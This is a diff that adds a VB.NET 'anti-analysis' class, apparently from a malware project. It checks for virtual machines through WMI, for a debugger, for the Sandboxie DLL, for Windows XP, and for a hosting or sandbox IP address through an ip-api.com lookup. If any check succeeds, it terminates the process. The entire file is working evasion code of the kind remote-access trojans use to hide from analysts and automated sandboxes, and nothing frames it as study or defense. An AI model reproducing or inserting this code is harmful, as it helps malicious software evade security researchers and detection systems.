@@ -1,0 +1,60 @@
+Imports System.Management
+Imports System.Runtime.InteropServices
+Public Class Analysis
+    Public Shared Sub RunAntiAnalysis()
+        If DetectManufacturer() OrElse DetectDebugger() OrElse DetectSandboxie() OrElse IsXP() OrElse anyrun() Then Environment.FailFast(Nothing)
+    End Sub
+    Private Shared Function IsXP() As Boolean
+        Try
+            If New Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp") Then
+                Return True
+            End If
+        Catch
+        End Try
+        Return False
+    End Function
+    Private Shared Function DetectManufacturer() As Boolean
+        Try
+            Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")
+                Dim item
+                Using items = searcher.[Get]()
+                    For Each item In items
+                        Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
+                        If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
+                            Return True
+                        End If
+                    Next
+                End Using
+            End Using
+        Catch
+        End Try
+        Return False
+    End Function
+    Public Shared Function DetectDebugger() As Boolean
+        Dim isDebuggerPresent As Boolean = False
+        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
+        Return isDebuggerPresent
+    End Function
+    Public Shared Function DetectSandboxie() As Boolean
+        If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
+            Return True
+        Else
+            Return False
+        End If
+    End Function
+    Public Shared Function anyrun() As Boolean
+        Try
+            Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
+            Return status.Contains("true")
+        Catch
+        End Try
+        Return False
+    End Function
+    <DllImport("kernel32.dll")>
+    Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
+    End Function
+    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>
+    Public Shared Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
+    End Function
+End Class
+
